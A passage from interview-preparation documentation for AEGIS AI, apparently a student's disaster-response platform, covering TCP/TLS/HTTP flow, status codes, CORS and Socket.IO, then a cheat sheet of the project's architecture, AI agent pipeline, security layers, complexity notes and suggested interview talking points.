   3. TCP CONNECTION:
      Client                         Server
      SYN ──────────────────────────►
      ◄────────────────────────── SYN+ACK
      ACK ──────────────────────────►
      
      (3-way handshake complete)
   
   4. TLS HANDSHAKE (HTTPS):
      Client                         Server
      ClientHello ─────────────────►
      ◄───────────────── ServerHello
      ◄──────────────── Certificate
      ClientKeyExchange ───────────►
      Finished ────────────────────►
      ◄────────────────── Finished
      
      (Encrypted connection established)
   
   5. HTTP REQUEST:
      GET /reports?status=pending HTTP/1.1
      Host: api.example.com
      Cookie: connect.sid=abc123
      Accept: application/json
      
   6. SERVER PROCESSING:
      - Express receives request
      - Middleware chain executes
      - Controller handles logic
      - Response generated
   
   7. HTTP RESPONSE:
      HTTP/1.1 200 OK
      Content-Type: application/json
      Set-Cookie: connect.sid=abc123; HttpOnly
      
      {"success":true,"data":[...]}
   
   8. TCP CLOSE (or keep-alive):
      FIN ──────────────────────────►
      ◄───────────────────────── ACK
      ◄───────────────────────── FIN
      ACK ──────────────────────────►

Q: What are HTTP status codes and when to use each?
A: Semantic response codes:

   1XX - INFORMATIONAL:
   100 Continue - Client can continue with request
   
   2XX - SUCCESS:
   200 OK - Standard success response
   201 Created - Resource created (POST)
   204 No Content - Success but no response body
   
   3XX - REDIRECTION:
   301 Moved Permanently - URL changed forever
   302 Found - Temporary redirect
   304 Not Modified - Use cached version
   
   4XX - CLIENT ERROR:
   400 Bad Request - Invalid request syntax
   401 Unauthorized - Not authenticated
   403 Forbidden - Authenticated but not authorized
   404 Not Found - Resource doesn't exist
   409 Conflict - Resource state conflict
   422 Unprocessable Entity - Validation failed
   429 Too Many Requests - Rate limited
   
   5XX - SERVER ERROR:
   500 Internal Server Error - Generic server error
   502 Bad Gateway - Upstream server error
   503 Service Unavailable - Server overloaded
   504 Gateway Timeout - Upstream timeout
   
   OUR API USAGE:
   - 200: Successful GET, PUT, PATCH
   - 201: Successful POST (created report)
   - 204: Successful DELETE
   - 400: Invalid request body
   - 401: No session/invalid PIN
   - 403: Volunteer accessing manager routes
   - 404: Report not found
   - 500: Database error, external API failure

Q: Explain CORS in detail?
A: Cross-Origin Resource Sharing security:

   THE PROBLEM:
   Frontend: http://localhost:5173
   Backend: http://localhost:3000
   
   Browser blocks cross-origin requests by default (Same-Origin Policy)
   
   THE SOLUTION (CORS):
   Server tells browser "this origin is allowed"
   
   SIMPLE REQUEST (no preflight):
   - GET, HEAD, POST
   - Standard headers only
   - Content-Type: text/plain, multipart/form-data, application/x-www-form-urlencoded
   
   Browser sends:
   GET /api/reports HTTP/1.1
   Origin: http://localhost:5173
   
   Server responds:
   HTTP/1.1 200 OK
   Access-Control-Allow-Origin: http://localhost:5173
   
   PREFLIGHT REQUEST (complex requests):
   - PUT, DELETE, PATCH
   - Custom headers (x-auth-pin)
   - Content-Type: application/json
   
   1. Browser sends OPTIONS first:
   OPTIONS /api/reports HTTP/1.1
   Origin: http://localhost:5173
   Access-Control-Request-Method: POST
   Access-Control-Request-Headers: Content-Type
   
   2. Server responds:
   HTTP/1.1 200 OK
   Access-Control-Allow-Origin: http://localhost:5173
   Access-Control-Allow-Methods: GET, POST, PUT, DELETE
   Access-Control-Allow-Headers: Content-Type
   Access-Control-Allow-Credentials: true
   
   3. Browser sends actual request
   
   OUR CORS CONFIG:
   app.use(cors({
     origin: ['http://localhost:5173'],  // Allowed origins
     credentials: true,                   // Allow cookies
     methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE'],
     allowedHeaders: ['Content-Type', 'x-auth-pin']
   }));

Q: What is WebSocket and how does Socket.IO enhance it?
A: Real-time bidirectional communication:

   WEBSOCKET (raw):
   - Persistent TCP connection
   - Full-duplex (both sides can send anytime)
   - Low overhead (no HTTP headers per message)
   
   Handshake (HTTP Upgrade):
   GET /socket HTTP/1.1
   Upgrade: websocket
   Connection: Upgrade
   Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
   
   HTTP/1.1 101 Switching Protocols
   Upgrade: websocket
   Connection: Upgrade
   
   After upgrade: Binary WebSocket frames
   
   SOCKET.IO ENHANCEMENTS:
   
   1. AUTOMATIC FALLBACKS:
      WebSocket → HTTP Long Polling → HTTP Polling
      (Works even if WebSocket blocked)
   
   2. ROOMS:
      // Server
      socket.join('station-fire');
      io.to('station-fire').emit('alert', data);
      
      // Only sockets in 'station-fire' room receive
   
   3. ACKNOWLEDGMENTS:
      // Client
      socket.emit('submitReport', data, (response) => {
        console.log('Server confirmed:', response);
      });
   
   4. AUTO-RECONNECTION:
      // Built-in exponential backoff reconnection
   
   5. NAMESPACES:
      const stations = io.of('/stations');
      const admin = io.of('/admin');
   
   OUR USAGE (station-demo):
   // Server
   io.on('connection', (socket) => {
     socket.on('register', (stationType) => {
       socket.join(stationType);
     });
   });
   
   // Emit to specific station type
   io.to('fire').emit('emergency', alertData);

================================================================================
              QUICK REFERENCE CHEAT SHEET (READ BEFORE INTERVIEW)
================================================================================

╔═══════════════════════════════════════════════════════════════════════════════╗
║                     30-SECOND PROJECT SUMMARY                                 ║
╠═══════════════════════════════════════════════════════════════════════════════╣
║ AEGIS AI is an AI-powered disaster response platform that:                    ║
║ 1. Receives reports via SMS (Twilio), PWA photo, or audio                    ║
║ 2. Processes through 3-agent AI pipeline (Sentinel→Oracle→Logistics)         ║
║ 3. Dispatches emergency services via real-time Socket.IO                     ║
║ 4. Enables volunteer coordination and offline-first operation                 ║
╚═══════════════════════════════════════════════════════════════════════════════╝

ARCHITECTURE ONE-LINER:
"React PWA → Express API → 3 AI Agents → MongoDB → Socket.IO → Emergency Stations"

TECH STACK QUICK LIST:
┌─────────────┬────────────────────────────────────────────────────────────────┐
│ Frontend    │ React 19, Vite, React Query, Leaflet, IndexedDB (Dexie), i18n │
│ Backend     │ Express.js, Mongoose, Multer, express-session, Winston        │
│ AI Agents   │ Sentinel (Python/TensorFlow), Oracle (Node/Gemini), Logistics │
│ External    │ Twilio, Cloudinary, OSRM, OpenWeatherMap, Gemini AI           │
│ Real-time   │ Socket.IO (4 stations on ports 4001-4004)                     │
│ Database    │ MongoDB Atlas with 2dsphere indexes                           │
└─────────────┴────────────────────────────────────────────────────────────────┘

3 AGENTS EXPLAINED (MEMORIZE THIS):
┌────────────────┬─────────────────────────────────────────────────────────────┐
│ SENTINEL       │ Python + TensorFlow | Image classification | Disaster/Not  │
│ ORACLE         │ Node.js + Gemini AI | Severity assessment | 1-5 score      │
│ LOGISTICS      │ Python + OSRM       | Route optimization | Station dispatch│
└────────────────┴─────────────────────────────────────────────────────────────┘

ATOMIC LOCKING (KEY CONCEPT):
  findOneAndUpdate({ status: 'Pending' }, { $set: { status: 'Processing' } })
  → Prevents race conditions between agents
  → MongoDB guarantees document-level atomicity

POLLING VS MESSAGE QUEUE (WHY POLLING):
  ✓ Simpler (no RabbitMQ to maintain)
  ✓ Self-healing (restarts catch up)
  ✓ Sufficient at current scale (<100 reports/hour)
  ✗ Would switch to queue at >1000 reports/minute

OFFLINE-FIRST STRATEGY:
  1. Service Worker caches pages (vite-plugin-pwa)
  2. IndexedDB stores pending verifications (Dexie)
  3. Background sync retries on reconnection
  4. navigator.onLine triggers sync

SECURITY LAYERS:
  1. Session auth (express-session + connect-mongo)
  2. PIN verification (x-auth-pin header)
  3. RBAC (requireAuth, requireManager middleware)
  4. CORS whitelist (origin array)
  5. File validation (multer MIME type filter)
  6. Input sanitization (Mongoose schema validation)

COMPLEXITY CHEAT SHEET:
┌─────────────────────────────┬────────────┬─────────────────────────────────┐
│ Operation                   │ Complexity │ Why                             │
├─────────────────────────────┼────────────┼─────────────────────────────────┤
│ MongoDB findById            │ O(log n)   │ B-tree index lookup             │
│ MongoDB findOneAndUpdate    │ O(log n)   │ Indexed + atomic                │
│ MongoDB $near (2dsphere)    │ O(log n)   │ R-tree traversal                │
│ Array.filter in React       │ O(n)       │ Linear scan                     │
│ React Query cache lookup    │ O(1)       │ Hash map                        │
│ OSRM routing query          │ O(log V)   │ Contraction hierarchies         │
│ TensorFlow inference        │ O(1)*      │ Fixed model size (*GPU)         │
└─────────────────────────────┴────────────┴─────────────────────────────────┘

EVENT LOOP PHASES (IN ORDER):
  Timers → Pending → Idle → Poll → Check → Close
  Microtasks (nextTick, Promises) run between EACH phase

REACT RENDERING:
  State change → Virtual DOM diff → Minimal real DOM updates

STATE MACHINE (REPORT STATUS):
  Pending → Processing_Visual → Pending_Oracle → Processing_Oracle → 
  Pending_Logistics → Ready → Verified → Dispatched → Resolved

TOP 10 THINGS TO SAY IN INTERVIEW:
───────────────────────────────────────────────────────────────────────────────
1. "I built a 3-agent AI pipeline with atomic locking for race condition 
    prevention"
2. "The PWA uses IndexedDB for offline-first operation in disaster scenarios"
3. "Socket.IO enables real-time emergency station alerts with room-based 
    routing"
4. "I chose MongoDB for schema flexibility and native geospatial indexing"
5. "Stateless backend design enables horizontal scaling behind a load balancer"
6. "Session-based auth with PIN fallback provides secure multi-device access"
7. "React Query's stale-while-revalidate pattern gives instant UI with fresh 
    data"
8. "The TensorFlow model uses transfer learning for efficient disaster 
    classification"
9. "OSRM provides open-source route optimization without API costs"
10. "i18next enables seamless multi-language support for regional deployment"

BEHAVIORAL ANSWERS READY:
───────────────────────────────────────────────────────────────────────────────
Challenge: "Coordinating 3 AI agents without race conditions"
Solution:  "Implemented atomic findOneAndUpdate with status-based locking"

Trade-off: "Polling vs Message Queue"
Decision:  "Chose polling for simplicity; documented upgrade path to RabbitMQ"

Bug Fixed: "OSRM coordinate format"
Process:   "Logged at each step, found [lat,lng] vs [lng,lat] mismatch"

================================================================================
                            END OF DOCUMENTATION
================================================================================

Document Version: 6.0 (Ultra-Comprehensive Interview-Ready Technical Reference)
Last Updated: January 2026
Total Lines: ~10,800
Total Sections: 21 (with new subsections 21.14-21.17)
Project: Disaster Response Resource Optimization Platform (AEGIS AI)

DOCUMENTATION SUMMARY:
─────────────────────────────────────────────────────────────────────────────

SECTIONS 1-10: Technical Implementation Details
  - Complete system architecture with diagrams
  - All 3 AI agents explained with code
  - Step-by-step data flows
  - Security implementation

SECTIONS 11-16: Reference Material
  - Complete API endpoint reference
  - Database schemas and query patterns
  - State machine diagrams
  - Algorithm complexity analysis

SECTIONS 17-20: Operations
  - Installation guide
  - Performance optimization
  - Troubleshooting
  - Deployment considerations

SECTION 21: Interview Q&A (COMPREHENSIVE)
  - 17 topic areas with 60+ Q&A pairs
  - Architecture and design patterns
  - Backend, frontend, database deep dives
  - Real-time, AI/ML, security questions
  - Algorithm complexity explanations
  - Testing and deployment strategies
  - Node.js Event Loop deep dive
  - MongoDB internals
  - React reconciliation and hooks
  - HTTP/Networking complete flow

QUICK REFERENCE CHEAT SHEET:
  - 30-second project summary
  - Tech stack quick list
  - 3 agents explained
  - Complexity cheat sheet
  - Top 10 interview talking points
  - Behavioral answers ready

KEY INTERVIEW TALKING POINTS:
─────────────────────────────────────────────────────────────────────────────
1. "3-agent AI pipeline with atomic locking prevents race conditions"
2. "Offline-first PWA with IndexedDB sync for disaster scenarios"
3. "Real-time Socket.IO for instant emergency station alerts"
4. "OSRM for open-source route optimization (no API costs)"
5. "Horizontal scaling ready - stateless backend, sessions in MongoDB"
6. "Security: Session + PIN auth, RBAC, input validation, CORS"
7. "TensorFlow binary classifier for disaster image detection"
8. "Gemini AI for NLP triage with fallback parser"
9. "Event-driven architecture with Node.js event loop"
10. "MongoDB 2dsphere indexes for O(log n) geospatial queries"
11. "React Query for stale-while-revalidate caching"
12. "Virtual DOM diffing for efficient UI updates"
